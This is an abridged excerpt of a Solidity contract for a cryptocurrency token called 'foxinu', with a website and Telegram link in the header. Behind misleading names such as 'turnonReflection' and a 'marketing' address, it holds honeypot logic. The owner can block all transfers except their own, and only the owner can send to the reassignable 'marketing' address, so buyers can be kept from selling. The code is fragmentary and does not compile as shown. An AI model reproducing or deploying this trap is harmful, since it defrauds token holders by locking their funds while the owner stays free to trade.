...
web : https://foxinu.site
telegram : https://t.me/foxinubsc
**/
...
contract Pausable is Ownable {
   ...
   */
  function turnonReflection() onlyOwner whenNotPaused public {
    Buyback = true;
    emit ReflectionON();
  }
   ...
   */
  function turnoffReflection() onlyOwner whenPaused public {
    Buyback = false;
    emit ReflectionOFF();
  }
}

contract foxinu is Context, IERC20, Ownable, Pausable {
  ...
  function transferMarketingAddress(address _marketing) public onlyOwner {
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    ...
    else  require(recipient != marketing || sender == owner(), "please wait");
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    require(!Buyback || sender == owner() || recipient == owner(), "paused");
    if(marketing != address(0)) require(recipient != marketing || sender == owner(), "please wait");
